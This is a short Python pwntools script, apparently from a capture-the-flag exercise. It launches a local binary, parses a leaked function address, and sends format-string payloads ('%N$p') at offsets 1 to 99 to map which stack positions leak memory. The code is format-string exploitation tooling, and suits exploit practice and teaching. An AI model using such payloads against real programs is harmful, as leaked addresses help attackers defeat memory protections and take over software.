from pwn import *

# Set up the binary and context
elf = context.binary = ELF('./6', checksec=False)

for i in range(1, 100):  # Start from 1; %0$p isn't valid in most cases
    try:
        # Create a new process
        p = process(level='error')

        # Clear initial output
        vuln_addr = p.recvline(timeout=1)
        p.recvline(timeout=1)
        vuln_match = re.search(rb'0x[0-9a-fA-F]+', vuln_addr)  # Use regex to find a hex value
        vuln_addr = int(vuln_match.group(0), 16)
        log.success(f"Vuln function address: {hex(vuln_addr)}")

        # Format and send the payload
        payload = f"%{i}$p".encode()
        p.sendline(payload)

        # Receive and parse the response
        result = p.recvline(timeout=1).decode().strip()

        # Print meaningful results
        if result and result != "(nil)":
            print(f"{i}: {result}")

        # Clean up
        p.close()
    except EOFError:
        pass
    except Exception as e:
        print(f"Error at index {i}: {e}")
        break
